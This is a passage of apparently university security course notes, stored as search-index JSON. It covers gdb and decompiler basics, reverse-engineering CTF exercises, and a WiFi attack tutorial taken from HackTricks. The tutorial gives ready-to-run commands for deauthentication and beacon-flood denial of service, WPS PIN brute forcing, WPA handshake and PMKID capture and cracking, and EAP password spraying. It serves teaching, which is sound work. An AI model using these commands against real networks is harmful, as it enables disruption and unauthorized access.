Usage","text":"<ul> <li><code>(gdb) x/x $rax</code>: Displays the content of the register RAX as hex bytes</li> <li><code>(gdb) x/i 0xdeadbeef</code>: Displays the instruction at address 0xdeadbeef</li> <li><code>(gdb) x/10s 0x893e10</code>: Displays 10 strings at the address</li> <li><code>(gdb) x/10gx 0x7fe10</code>: Displays 10 giant words as hex at the address</li> </ul>"},{"location":"CS315/2021/Week%206/#forking","title":"Forking","text":"<p>If the program happens to be an accept-and-fork server, gdb will have issues following the child or parent processes. In order to specify how you want gdb to function you can use the command <code>set follow-fork-mode [on/off]</code></p>"},{"location":"CS315/2021/Week%206/#setting-data","title":"Setting Data","text":"<p>If you would like to set data at any point, it is possible using the command <code>set [Address/Register]=[Hex Data]</code></p>"},{"location":"CS315/2021/Week%206/#example-usage_3","title":"Example Usage","text":"<ul> <li><code>set $rax=0x0</code>: Sets the register rax to 0</li> <li><code>set 0x1e4a70=0x123</code>: Sets the data at 0x1e4a70 to 0x123</li> </ul>"},{"location":"CS315/2021/Week%206/#process-mapping","title":"Process Mapping","text":"<p>A handy way to find the process's mapped address spaces is to use <code>info proc map</code>:</p> <pre><code>Mapped address spaces:\n\n    Start Addr   End Addr       Size     Offset objfile\n     0x8048000  0x8049000     0x1000        0x0 /directory/program\n     0x8049000  0x804a000     0x1000        0x0 /directory/program\n     0x804a000  0x804b000     0x1000     0x1000 /directory/program\n    0xf75cb000 0xf75cc000     0x1000        0x0\n    0xf75cc000 0xf7779000   0x1ad000        0x0 /lib32/libc-2.23.so\n    0xf7779000 0xf777b000     0x2000   0x1ac000 /lib32/libc-2.23.so\n    0xf777b000 0xf777c000     0x1000   0x1ae000 /lib32/libc-2.23.so\n    0xf777c000 0xf7780000     0x4000        0x0\n    0xf778b000 0xf778d000     0x2000        0x0 [vvar]\n    0xf778d000 0xf778f000     0x2000        0x0 [vdso]\n    0xf778f000 0xf77b1000    0x22000        0x0 /lib32/ld-2.23.so\n    0xf77b1000 0xf77b2000     0x1000        0x0\n    0xf77b2000 0xf77b3000     0x1000    0x22000 /lib32/ld-2.23.so\n    0xf77b3000 0xf77b4000     0x1000    0x23000 /lib32/ld-2.23.so\n    0xffc59000 0xffc7a000    0x21000        0x0 [stack]\n</code></pre> <p>This will show you where the stack, heap (if there is one), and libc are located.</p>"},{"location":"CS315/2021/Week%206/#attaching-processes","title":"Attaching Processes","text":"<p>Another useful feature of GDB is to attach to processes which are already running. Simply launch gdb using <code>gdb</code>, then find the process id of the program you would like to attach to an execute <code>attach [pid]</code>.</p>"},{"location":"CS315/2021/Week%206/#decompilers","title":"Decompilers","text":"<p>Decompilers do the impossible and reverse compiled code back into psuedocode/code.</p> <p>IDA offers HexRays, which translates machine code into a higher language pseudocode.</p> <p></p>"},{"location":"CS315/2021/Week%206/#example-workflow","title":"Example Workflow","text":"<p>Let's say we are disassembling a program which has the source code:</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid printSpacer(int num){\n    for(int i = 0; i &lt; num; ++i){\n        printf(\"-\");\n    }\n    printf(\"\\n\");\n}\n\nint main()\n{\n    char* string = \"Hello, World!\";\n    for(int i = 0; i &lt; 13; ++i){\n        printf(\"%c\", string[i]);\n        for(int j = i+1; j &lt; 13; j++){\n            printf(\"%c\", string[j]);\n        }\n        printf(\"\\n\");\n        printSpacer(13 - i);\n    }\n    return 0;\n}\n</code></pre> <p>And creates an output of:</p> <pre><code>Hello, World!\n-------------\nello, World!\n------------\nllo, World!\n-----------\nlo, World!\n----------\no, World!\n---------\n, World!\n--------\n World!\n-------\nWorld!\n------\norld!\n-----\nrld!\n----\nld!\n---\nd!\n--\n!\n-\n</code></pre> <p>If we are given a binary compiled from that source and we want to figure out how the source looks, we can use a decompiler to get c pseudocode which we can then use to reconstruct the function. The sample decompilation can look like:</p> <pre><code>printSpacer:\nint __fastcall printSpacer(int a1)\n{\n  int i; // [rsp+8h] [rbp-8h]\n\n  for ( i = 0; i &lt; a1; ++i )\n    printf(\"-\");\n  return printf(\"\\n\");\n}\n\nmain:\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+18h] [rbp-18h]\n  signed int i; // [rsp+1Ch] [rbp-14h]\n\n  for ( i = 0; i &lt; 13; ++i )\n  {\n    v4 = i + 1;\n    printf(\"%c\", (unsigned int)aHelloWorld[i], envp);\n    while ( v4 &lt; 13 )\n      printf(\"%c\", (unsigned int)aHelloWorld[v4++]);\n    printf(\"\\n\");\n    printSpacer(13 - i);\n  }\n  return 0;\n}\n</code></pre> <p>A good method of getting a good representation of the source is to convert the decompilation into Python since Python is basically psuedocode that runs. Starting with main often allows you to gain a good overview of what the program is doing and will help you translate the other functions.</p>"},{"location":"CS315/2021/Week%206/#main","title":"Main","text":"<p>We know we will start with a main function and some variables, if you trace the execution of the variables, you can oftentimes determine the variable type. Because i is being used as an index, we know its an int, and because v4 used as one later on, it too is an index. We can also see that we have a variable aHelloWorld being printed with \"%c\", we can determine it represents the 'Hello, World!' string. Lets define all these variables in our Python main function:</p> <pre><code>def main():\n    string = \"Hello, World!\"\n    i = 0\n    v4 = 0\n    for i in range(0, 13):\n        v4 = i + 1\n        print(string[i], end='')\n        while v4 &lt; 13:\n            print(string[v4], end='')\n            v4 += 1\n        print()\n        printSpacer(13-i)\n</code></pre>"},{"location":"CS315/2021/Week%206/#printspacer-function","title":"printSpacer Function","text":"<p>Now we can see that printSpacer is clearly being fed an int value. Translating it into python shouldn't be too hard.</p> <pre><code>def printSpacer(number):\n    i = 0\n    for i in range(0, number):\n        print(\"-\", end='')\n    print()\n</code></pre>"},{"location":"CS315/2021/Week%206/#results","title":"Results","text":"<p>Running main() gives us:</p> <pre><code>Hello, World!\n-------------\nello, World!\n------------\nllo, World!\n-----------\nlo, World!\n----------\no, World!\n---------\n, World!\n--------\n World!\n-------\nWorld!\n------\norld!\n-----\nrld!\n----\nld!\n---\nd!\n--\n!\n-\n</code></pre>"},{"location":"CS315/2021/Week%206/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%206/#4-pt-de-android","title":"(4 pt) De-Android","text":"<p>Android source code is easy to de-compile. Rather than reading assembly codes from the beginning, why not try some java first?</p> <p>Try to reverse this Android apk file and find flag in it.</p> <p><code>Flag format: CTFlearn{******}</code></p> <p>flag.apk</p> <p>Hint1: if you really have difficult to reverse Android, I would recommend you to try jadx.</p> <p>Hint2: md5 is old and not safe. So many methods can help you to crack md5.</p>"},{"location":"CS315/2021/Week%206/#4-pt-touhou-players-win-twice","title":"(4 pt) Touhou Players Win Twice","text":"<p>I heard that some SUSTCers are really good at playing Touhou Project (\u6771\u65b9project) Games. As a kind of STG game, Touhou Project is very difficult and not friendly for beginners.</p> <p>Some one sent me this game and challenged me: if you can pass all 6 levels in <code>Lunatic</code> difficulty, you can have the flag.</p> <p></p> <p>Each time you finish a level in Lunatic difficulty, one part of flag is given to <code>flag.txt</code> under the game directory. I have several ideas for you to break this game:</p> <ol> <li>As a real touhou player, you can play this game until you finish all levels.</li> <li>As a reverse engineer, you may observe the assembly codes and find how flag is given after each level.</li> <li>As a game trainer developer, you also can write a cheat for this game.</li> <li>As a social engineer, you can convince CS315's professor and TAs to tell you the flag.</li> </ol> <p>Good luck!</p> <p>https://mega.nz/file/KtNkiZga#juXA-LhgguC8De76CTYnHjPaObvlNcyjyEDXjhkSDCs</p>"},{"location":"CS315/2021/Week%206/#2-pt-javaisez3","title":"(2 pt) javaisez3","text":"<p>3rd round of your local Java rev! Note: This requires Java 11 and above to run.</p> <p>javaisez3.jar</p>"},{"location":"CS315/2021/Week%207/","title":"Week7 WLAN: Attacking WiFi","text":"<p>According to @Hacktricks: https://book.hacktricks.xyz/</p>"},{"location":"CS315/2021/Week%207/#wifi-basic-commands","title":"Wifi basic commands","text":"<pre><code>ip link show #List available interfaces\niwconfig #List available interfaces\nairmon-ng check kill #Kill annoying processes\nairmon-ng start wlan0 #Monitor mode\nairmon-ng stop wlan0mon #Managed mode\nairodump-ng wlan0mon #Scan (default 2.4Ghz)\nairodump-ng wlan0mon --band a #Scan 5Ghz\niwconfig wlan0 mode monitor #Put in mode monitor\niwconfig wlan0mon mode managed #Quit mode monitor - managed mode\niw dev wlan0 scan | grep \"^BSS\\|SSID\\|WSP\\|Authentication\\|WPS\\|WPA\" #Scan available wifis\n</code></pre>"},{"location":"CS315/2021/Week%207/#tools","title":"Tools","text":""},{"location":"CS315/2021/Week%207/#eaphammer","title":"EAPHammer","text":"<pre><code>git clone https://github.com/s0lst1c3/eaphammer.git\n./kali-setup\n</code></pre>"},{"location":"CS315/2021/Week%207/#airgeddon","title":"Airgeddon","text":"<pre><code>mv `which dhcpd` `which dhcpd`.old\napt install isc-dhcp-server\napt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe\n</code></pre>"},{"location":"CS315/2021/Week%207/#run-airgeddon-with-docker","title":"Run airgeddon with docker","text":"<pre><code>docker run \\\n          --rm \\\n          -ti \\\n          --name airgeddon \\\n          --net=host \\\n          --privileged \\\n          -p 3000:3000 \\\n          -v /tmp:/io \\\n          -e DISPLAY=$(env | grep DISPLAY | awk -F \"=\" '{print $2}') \\\n          v1s1t0r1sh3r3/airgeddon\n</code></pre> <p>From: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux</p>"},{"location":"CS315/2021/Week%207/#resume-attacks","title":"Resume attacks","text":"<ul> <li>DoS</li> <li>Deauthentication/disassociation -- Disconnect everyone (or a specific ESSID/Client)</li> <li>Random fake APs -- Hide nets, possible crash scanners)</li> <li>Overload AP -- Try to kill the AP (usually not very useful)</li> <li>WIDS -- Play with the IDS</li> <li>TKIP, EAPOL -- Some specific attacks to DoS some APs</li> <li>Cracking</li> <li>Crack WEP (several tools and methods)</li> <li>WPA-PSK<ul> <li>WPS pin \"Brute-Force\"</li> <li>WPA PMKID bruteforce</li> <li>[DoS +] WPA handshake capture + Cracking</li> </ul> </li> <li>WPA-MGT<ul> <li>Username capture</li> <li>Bruteforce Credentials</li> </ul> </li> <li>Evil Twin (with or without DoS)</li> <li>Open Evil Twin [+ DoS] -- Useful to capture captive portal creds and/or perform LAN attacks</li> <li>WPA-PSK Evil Twin -- Useful to network attacks if you know the password</li> <li>WPA-MGT -- Useful to capture company credentials</li> <li>MANA, Loud MANA, Known beacon</li> <li>+ Open -- Useful to capture captive portal creds and/or perform LAN attacks</li> <li>+ WPA -- Useful to capture WPA handshakes</li> </ul>"},{"location":"CS315/2021/Week%207/#dos","title":"DOS","text":""},{"location":"CS315/2021/Week%207/#deauthentication-packets","title":"Deauthentication Packets","text":"<p>The most common way this sort of attack is done is with deauthentication packets. These are a type of \"management\" frame responsible for disconnecting a device from an access point. Forging these packets is the key to hacking many Wi-Fi networks, as you can forcibly disconnect any client from the network at any time. The ease of which this can be done is somewhat frightening and is often done as part of gathering a WPA handshake for cracking.</p> <p>Aside from momentarily using this disconnection to harvest a handshake to crack, you can also just let those deauths keep coming, which has the effect of peppering the client with deauth packets seemingly from the network they are connected to. Because these frames aren't encrypted, many programs take advantage of management frames by forging them and sending them to either one or all devices on a network. Description from here.</p>"},{"location":"CS315/2021/Week%207/#deauthentication-using-aireplay-ng","title":"Deauthentication using Aireplay-ng","text":"<pre><code>aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0\n</code></pre> <ul> <li>-0 means deauthentication</li> <li>1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously</li> <li>-a 00:14:6C:7E:40:80 is the MAC address of the access point</li> <li>-c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then broadcast deauthentication is sent (not always work)</li> <li>ath0 is the interface name</li> </ul>"},{"location":"CS315/2021/Week%207/#disassociation-packets","title":"Disassociation Packets","text":"<p>Disassociation packets are another type of management frame that is used to disconnect a node (meaning any device like a laptop or cell phone) from a nearby access point. The difference between deauthentication and disassociation frames is primarily the way they are used.</p> <p>An AP looking to disconnect a rogue device would send a deauthentication packet to inform the device it has been disconnected from the network, whereas a disassociation packet is used to disconnect any nodes when the AP is powering down, rebooting, or leaving the area.</p> <p>Description from here.</p> <p>This attack can be performed by mdk4(mode \"d\"):</p> <pre><code># -c &lt;channel&gt;\n# -b victim_client_mac.txt contains the MAC address of the device to eliminate\n# -e WifiName is the name of the wifi\n# -B BSSID is the BSSID of the AP\n# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them \nmdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F\n</code></pre>"},{"location":"CS315/2021/Week%207/#more-dos-attacks-by-mdk4","title":"More DOS attacks by mdk4","text":"<p>From here.</p> <p>ATTACK MODE b: Beacon Flooding</p> <p>Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers!</p> <pre><code># -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit\n# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)\n# -m use real BSSIDS\n# All the parameters are optional and you could load ESSIDs from a file\nmdk4 wlan0mon b -a -w nta -m\n</code></pre> <p>ATTACK MODE a: Authentication Denial-Of-Service</p> <p>Sends authentication frames to all APs found in range. Too many clients can freeze or reset several APs.</p> <pre><code># -a BSSID send random data from random clients to try the DoS\n# -i BSSID capture and repeat pakets from authenticated clients\n# -m use real MACs\n# only -a or -i can be used\nmdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m\n</code></pre> <p>ATTACK MODE p: SSID Probing and Bruteforcing</p> <p>Probes APs and checks for answer, useful for checking if SSID has been correctly decloaked and if AP is in your sending range. Bruteforcing of hidden SSIDs with or without a wordlist is also available.</p> <p>ATTACK MODE m: Michael Countermeasures Exploitation</p> <p>Sends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on TKIP APs. AP will then shutdown for a whole minute, making this an effective DoS.</p> <pre><code># -t &lt;BSSID&gt; of a TKIP AP\n# -j use inteligent replay to create the DoS\nmdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]\n</code></pre> <p>ATTACK MODE e: EAPOL Start and Logoff Packet Injection</p> <p>Floods an AP with EAPOL Start frames to keep it busy with fake sessions and thus disables it to handle any legitimate clients. Or logs off clients by injecting fake EAPOL Logoff messages.</p> <pre><code># Use Logoff messages to kick clients\nmdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]\n</code></pre> <p>ATTACK MODE s: Attacks for IEEE 802.11s mesh networks</p> <p>Various attacks on link management and routing in mesh networks. Flood neighbors and routes, create black holes and divert traffic! </p> <p>ATTACK MODE w: WIDS Confusion</p> <p>Confuse/Abuse Intrusion Detection and Prevention Systems by cross-connecting clients to multiple WDS nodes or fake rogue APs.</p> <pre><code># -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)\nmkd4 -e &lt;SSID&gt; -c &lt;channel&gt; [-z]\n</code></pre> <p>ATTACK MODE f: Packet Fuzzer</p> <p>A simple packet fuzzer with multiple packet sources and a nice set of modifiers. Be careful!</p>"},{"location":"CS315/2021/Week%207/#airggedon","title":"Airggedon","text":"<p>Airgeddon offers most of the attacks proposed in the previous comments:</p> <p></p>"},{"location":"CS315/2021/Week%207/#wps","title":"WPS","text":"<p>WPS stands for Wi-Fi Protected Setup. It is a wireless network security standard that tries to make connections between a router and wireless devices faster and easier. WPS works only for wireless networks that use a password that is encrypted with the WPA Personal or WPA2 Personal security protocols. WPS doesn't work on wireless networks that are using the deprecated WEP security, which can be cracked easily by any hacker with a basic set of tools and skills. (From here)</p> <p>WPS uses a 8 length PIN to allow a user to connect to the network, but it's first checked the first 4 numbers and, if correct, then is checked the second 4 numbers. Then, it is possible to Brute-Force the first half and then the second half (only 11000 possibilities).</p>"},{"location":"CS315/2021/Week%207/#wps-bruteforce","title":"WPS Bruteforce","text":"<p>There are 2 main tools to perform this action: Reaver and Bully.</p> <ul> <li> <p>Reaver has been designed to be a robust and practical attack against WPS, and has been tested against a wide variety of access points and WPS implementations.</p> </li> <li> <p>Bully is a new implementation of the WPS brute force attack, written in C. It has several advantages over the original reaver code: fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options. It runs on Linux, and was specifically developed to run on embedded Linux systems (OpenWrt, etc) regardless of architecture.</p> </li> </ul> <p>Bully provides several improvements in the detection and handling of anomalous scenarios. It has been tested against access points from numerous vendors, and with differing configurations, with much success.</p> <p>If the WPS valid code is found, both Bully and Reaver will use it to discover the WPA/WPA2 PSK used to protect the network, so you will be able to connect anytime you need it.</p> <pre><code>reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot    \nbully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3\n</code></pre>"},{"location":"CS315/2021/Week%207/#smart-brute-force","title":"Smart Brute force","text":"<p>Instead of starting trying every possible PIN, you should check if there are available PINs discoveredfor the AP you are attacking (depending of the manufacturer MAC) and the PIN software generated PINs.</p> <ul> <li>The database of known PINs is made for Access Points of certain manufacturers for which it is known that they use the same WPS PINs. This database contains the first three octets of MAC-addresses and a list of corresponding PINs that are very likely for this manufacturer.</li> <li>There are several algorithms for generating WPS PINs. For example, ComputePIN and EasyBox use the MAC-address of the Access Point in their calculations. But the Arcadyan algorithm also requires a device ID.</li> </ul>"},{"location":"CS315/2021/Week%207/#wps-pixie-dust-attack","title":"WPS Pixie Dust attack","text":"<p>Dominique Bongard discovered that some APs have weak ways of generating nonces (known as E-S1 and E-S2) that are supposed to be secret. If we are able to figure out what these nonces are, we can easily find the WPS PIN of an AP since the AP must give it to us in a hash in order to prove that it also knowns the PIN, and the client is not connecting to a rouge AP. These E-S1 and E-S2 are essentially the \"keys to unlock the lock box\" containing the WPS pin. More info here: https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)</p> <p>Basically, some implementations failed in the use of random keys to encrypt the 2 parts of the the PIN(as it is discomposed in 2 parts during the authentication communication and sent to the client), so an offline attack could be used to brute force the valid PIN.</p> <pre><code>reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv\nbully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3\n</code></pre>"},{"location":"CS315/2021/Week%207/#null-pin-attack","title":"Null Pin attack","text":"<p>Some really bad implementations allowed the Null PIN to connect (very weird also). Reaver can test this (Bully cannot).</p> <pre><code> reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''\n</code></pre>"},{"location":"CS315/2021/Week%207/#airgeddon_1","title":"Airgeddon","text":"<p>All the proposed WPS attacks can be easily performed using *airgeddon.*</p> <p></p> <ul> <li>5 and 6 lets you try your custom PIN (if you have any)</li> <li>7 and 8 perform the Pixie Dust attack</li> <li>13 allows you to test the NULL PIN</li> <li>11 and 12 will recollect the PINs related to the selected AP from available databases and generate possible PINs using: ComputePIN, EasyBox and optionally Arcadyan (recommended, why not?)</li> <li>9 and 10 will test every possible PIN</li> </ul>"},{"location":"CS315/2021/Week%207/#wep","title":"WEP","text":"<p>So broken and disappeared that I am not going to talk about it. Just know that *airgeddon* have a WEP option called \"All-in-One\" to attack this kind of protection. More tools offer similar options.</p> <p></p>"},{"location":"CS315/2021/Week%207/#wpawpa2-psk","title":"WPA/WPA2 PSK","text":""},{"location":"CS315/2021/Week%207/#pmkid","title":"PMKID","text":"<p>In 2018 hashcat authors disclosed a new type of attack which not only relies on one single packet, but it doesn\u2019t require any clients to be connected to our target AP or, if clients are connected, it doesn\u2019t require us to send deauth frames to them, there\u2019s no interaction between the attacker and client stations, but just between the attacker and the AP, interaction which, if the router is vulnerable, is almost immediate!</p> <p>It turns out that a lot of modern routers append an optional field at the end of the first EAPOL frame sent by the AP itself when someone is associating, the so called <code>Robust Security Network</code>, which includes something called <code>PMKID</code></p> <p>As explained in the original post, the PMKID is derived by using data which is known to us:</p> <pre><code>PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA)\n</code></pre> <p>Since the \u201cPMK Name\u201d string is constant, we know both the BSSID of the AP and the station and the <code>PMK</code> is the same one obtained from a full 4-way handshake, this is all hashcat needs in order to crack the PSK and recover the passphrase! Description obtained from here.</p> <p>To gather this information and bruteforce locally the password you can do:</p> <pre><code>airmon-ng check kill\nairmon-ng start wlan0\ngit clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install\nhcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1\n</code></pre> <pre><code>#You can also obtains PMKIDs using eaphammer\n./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1\n</code></pre> <p>The PMKIDs captured will be shown in the console and also saved inside /tmp/attack.pcap** Now, convert the capture to hashcat/john** format and crack it:</p> <pre><code>hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng\nhashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt\njohn hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> <p>Please note the the format of a correct hash contains 4 parts, like: 4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7*566f6461666f6e65436f6e6e6563743034383131343838 If yours only contains 3 parts, then, it is invalid (the PMKID capture wasn't valid).</p> <p>Note that <code>hcxdumptool</code>also capture handshakes (something like this will appear: <code>MP:M1M2 RC:63258 EAPOLTIME:17091</code>). You could transform the handshakes to hashcat/john format using <code>cap2hccapx</code></p> <pre><code>tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap\ncap2hccapx pmkid.pcapng pmkid.hccapx [\"Filter_ESSID\"]\nhccap2john pmkid.hccapx &gt; handshake.john\njohn handshake.john --wordlist=/usr/share/wordlists/rockyou.txt\naircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes\n</code></pre> <p>I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool.</p>"},{"location":"CS315/2021/Week%207/#handshake-capture","title":"Handshake capture","text":"<p>One way to attack WPA/WPA2 networks is to capture a handshake and try to crack the used password offline. To do so you need to find the BSSID and channel of the victim network, and a client that is connected to the network. Once you have that information you have to start listening to all the commutation of that BSSID in that channel, because hopefully the handshake will be send there:</p> <pre><code>airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap\n</code></pre> <p>Now you need to deauthenticate the client for a few seconds so it will automatically authenticate again to the AP (please read the part of DoS to find several ways to deauthenticate a client):</p> <pre><code>aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work\n</code></pre> <p>Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network.</p> <p>Once in the<code>airodump-ng</code> appears some handshake information this means that the handshake was captured and you can stop listening:</p> <p></p> <p>Once the handshake is captured you can crack it with <code>aircrack-ng</code>:</p> <pre><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap\n</code></pre>"},{"location":"CS315/2021/Week%207/#check-if-handshake-in-file","title":"Check if handshake in file","text":""},{"location":"CS315/2021/Week%207/#aircrack","title":"aircrack","text":"<pre><code>aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture\n</code></pre>"},{"location":"CS315/2021/Week%207/#tshark","title":"tshark","text":"<pre><code>tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.\n</code></pre>"},{"location":"CS315/2021/Week%207/#cowpatty","title":"cowpatty","text":"<pre><code>cowpatty -r psk-01.cap -s \"ESSID\" -f -\n</code></pre> <p>If this tool finds an uncompleted handshake of an ESSID before the completed one, it won't detect the valid one.</p>"},{"location":"CS315/2021/Week%207/#pyrit","title":"pyrit","text":"<pre><code>apt-get install pyrit #Not working for newer versions of kali\npyrit -r psk-01.cap analyze\n</code></pre>"},{"location":"CS315/2021/Week%207/#wpa-enterprise-mgt","title":"WPA Enterprise (MGT)","text":"<p>It is important to talk about the different authentication methods that could be used by an enterprise Wifi. For this kind of Wifis you will probably find in<code>airodump-ng</code>something like this:</p> <pre><code>6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi\n</code></pre> <p>EAP (Extensible Authentication Protocol) the skull of the authentication communication, on top of this, an authentication algorithm is used by the server to authenticate the client (supplicant) and in same cases by the client to authenticate the server. Main authentication algorithms used in this case:</p> <ul> <li>EAP-GTC: Is an EAP method to support the use of hardware tokens and one-time passwords with EAP-PEAP. Its implementation is similar to MSCHAPv2, but does not use a peer challenge. Instead, passwords are sent to the access point in plaintext (very interesting for downgrade attacks).</li> <li>EAP-MD-5 (Message Digest): The client send the MD5 hash of the password. Not recommended: Vulnrable to dictionary attacks, no server authentication and no way to generate per session wired equivalent privacy (WEP) keys.</li> <li>EAP-TLS (Transport Layer Security): It relies on client-side and server-side certificates to perform authentication and can be used to dynamically generate user-based and session-based WEP keys to secure subsequent communications.</li> <li>EAP-TTLS (Tunneled Transport Layer Security): Mutual authentication of the client and network through an encrypted channel (or tunnel), as well as a means to derive dynamic, per-user, per-session WEP keys. Unlike EAP-TLS, EAP-TTLS requires only server-side certificates (client will use credentials).</li> <li>PEAP (Protected Extensible Authentication Protocol): PEAP is like the EAP protocol but creating a TLS tunnel to protect the communication. Then, weak authentication protocols can by used on top of EAP as they will be protected by the tunnel.</li> <li>PEAP-MSCHAPv2: This is also known as just PEAP because it is widely adopted. This is just the vulnerable challenge/response called MSCHAPv2 on to of PEAP (it is protected by the TLS tunnel).</li> <li>PEAP-EAP-TLS or just PEAP-TLS: Is very similar to EAP-TLS but a TLS tunnel is created before the certificates are exchanged.</li> </ul> <p>You can find more information about these authentication methods here and here.</p>"},{"location":"CS315/2021/Week%207/#username-capture","title":"Username Capture","text":"<p>Reading https://tools.ietf.org/html/rfc3748#page-27 it looks like if you are using EAP the \"Identity\" messages must be supported, and the username is going to be sent in clear in the \"Response Identity\" messages.</p> <p>Even using one of the most secure of authentication methods: PEAP-EAP-TLS, it is possible to capture the username sent in the EAP protocol. To do so, capture a authentication communication (start <code>airodump-ng</code> inside a channel and <code>wireshark</code>in the same interface) and filter the packets by<code>eapol</code>. Inside the \"Response, Identity\" packet, the username of the client will appear.</p> <p></p>"},{"location":"CS315/2021/Week%207/#anonymous-identities","title":"Anonymous Identities","text":"<p>(Info taken from https://www.interlinknetworks.com/app_notes/eap-peap.htm)</p> <p>Both EAP-PEAP and EAP-TTLS support identity hiding.  In a WiFi environment, the access point (AP) typically generates an EAP-Identity request as part of the association process.  To preserve anonymity, the EAP client on the user\u2019s system may respond with only enough information to allow the first hop RADIUS server to process the request, as shown in the following examples.</p> <ul> <li>EAP-Identity = anonymous</li> </ul> <p>In this example, all users will share the pseudo-user-name \u201canonymous\u201d.  The first hop RADIUS server is an EAP-PEAP or EAP-TTLS server which drives the server end of the PEAP or TTLS protocol.  The inner (protected) authentication type will then be either handled locally or proxied to a remote (home) RADIUS server.</p> <ul> <li>EAP-Identity = anonymous@realm_x</li> </ul> <p>In this example, users belonging to different realms hide their own identity but indicate which realm they belong to so that the first hop RADIUS server may proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms which will act as the PEAP or TTLS server.  The first hop server acts purely as a RADIUS relay node.</p> <p>Alternatively, the first hop server may act as the EAP-PEAP or EAP-TTLS server and either process the protected authentication method or proxy it to another server.  This option may be used to configure different policies for different realms.</p> <p>In EAP-PEAP, once the PEAP server and the PEAP client establish the TLS tunnel, the PEAP server generates an EAP-Identity request and transmits it down the TLS tunnel.  The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user\u2019s true identity down the encrypted tunnel.  This prevents anyone eavesdropping on the 802.11 traffic from discovering the user\u2019s true identity.</p> <p>EAP-TTLS works slightly differently.  With EAP-TTLS, the client typically authenticates via PAP or CHAP protected by the TLS tunnel.  In this case, the client will include a User-Name attribute and either a Password or CHAP-Password attribute in the first TLS message sent after the tunnel is established.</p> <p>With either protocol, the PEAP/TTLS server learns the user\u2019s true identity once the TLS tunnel has been established.  The true identity may be either in the form user@realm or simply user**.  If the PEAP/TTLS server is also authenticating the user**, it now knows the user\u2019s identity and proceeds with the authentication method being protected by the TLS tunnel.  Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user\u2019s home RADIUS server.  This new RADIUS request has the PEAP or TTLS protocol stripped out.  If the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper.  The User-Name attribute of the outgoing RADIUS message contains the user\u2019s true identity \u2013 not the anonymous identity from the User-Name attribute of the incoming RADIUS request.  If the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes recovered from the TLS payload are placed in the outgoing RADIUS message in place of the anonymous User-Name and TTLS EAP-Message attributes included in the incoming RADIUS request.</p>"},{"location":"CS315/2021/Week%207/#eap-bruteforce-password-spray","title":"EAP-Bruteforce (password spray)","text":"<p>If the client is expected to use a username and password (notice that EAP-TLS won't be valid in this case), then you could try to get a list a usernames (see next part) and passwords and try to bruteforce the access using air-hammer.</p> <pre><code>./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt\n</code></pre> <p>You could also do this attack using <code>eaphammer</code>:</p> <pre><code>./eaphammer --eap-spray \\\n    --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \\\n    --essid example-wifi \\\n    --password bananas \\\n    --user-list users.txt\n</code></pre>"},{"location":"CS315/2021/Week%207/#client-attacks-theory","title":"Client attacks 